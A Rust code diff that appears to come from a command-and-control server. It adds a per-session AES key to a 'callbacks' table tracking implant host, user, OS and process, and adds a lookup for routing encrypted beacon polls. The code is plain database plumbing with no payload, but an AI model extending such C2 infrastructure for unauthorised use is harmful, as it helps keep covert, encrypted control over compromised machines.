@@ -568,13 +568,15 @@ impl Repository {
         os: &str,
         arch: &str,
         pid: u32,
+        session_key: &str,
     ) -> Result<(), AppError> {
         sqlx::query(
-            "INSERT INTO callbacks (id, host, user_name, os, arch, process, status, last_seen) \
-             VALUES (?, ?, ?, ?, ?, ?, 'active', strftime('%Y-%m-%dT%H:%M:%fZ', 'now')) \
+            "INSERT INTO callbacks (id, host, user_name, os, arch, process, status, session_key, last_seen) \
+             VALUES (?, ?, ?, ?, ?, ?, 'active', ?, strftime('%Y-%m-%dT%H:%M:%fZ', 'now')) \
              ON CONFLICT(id) DO UPDATE SET \
              host = excluded.host, user_name = excluded.user_name, os = excluded.os, \
              arch = excluded.arch, process = excluded.process, status = 'active', \
+             session_key = excluded.session_key, \
              last_seen = strftime('%Y-%m-%dT%H:%M:%fZ', 'now')",
         )
         .bind(session_id)
@@ -583,10 +585,23 @@ impl Repository {
         .bind(os)
         .bind(arch)
         .bind(pid.to_string())
+        .bind(session_key)
         .execute(&self.pool)
         .await
         .map_err(|_| AppError::Internal)?;
         Ok(())
+    }
+
+    /// Look up the per-session AES key (base64) for a callback id, for routing
+    /// beacon polls to the right cipher. Returns None if unknown.
+    pub async fn session_key_for(&self, session_id: &str) -> Result<Option<String>, AppError> {
+        sqlx::query_scalar::<_, String>(
+            "SELECT session_key FROM callbacks WHERE id = ?",
+        )
+        .bind(session_id)
+        .fetch_optional(&self.pool)
+        .await
+        .map_err(|_| AppError::Internal)
     }
 
     /// Refresh a callback's last-seen timestamp on each beacon poll.
